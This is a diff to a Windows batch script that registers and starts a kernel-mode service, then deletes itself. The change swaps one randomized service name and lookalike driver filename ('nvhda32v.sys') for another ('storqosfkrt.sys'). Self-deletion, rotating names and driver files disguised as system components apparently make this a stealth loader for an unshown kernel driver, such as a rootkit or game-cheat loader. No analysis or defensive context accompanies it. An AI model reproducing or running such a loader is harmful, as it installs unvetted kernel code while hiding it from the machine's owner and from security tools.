@@ -1,7 +1,7 @@
 @echo off
 cd %~dp0
-sc create CaptureService_7885 binpath=C:\Windows\System32\drivers\nvhda32v.sys type=kernel
-sc start CaptureService_7885
+sc create MfcServiceCapture_8572 binpath=C:\Windows\System32\drivers\storqosfkrt.sys type=kernel
+sc start MfcServiceCapture_8572
 del "%~f0"
 
 
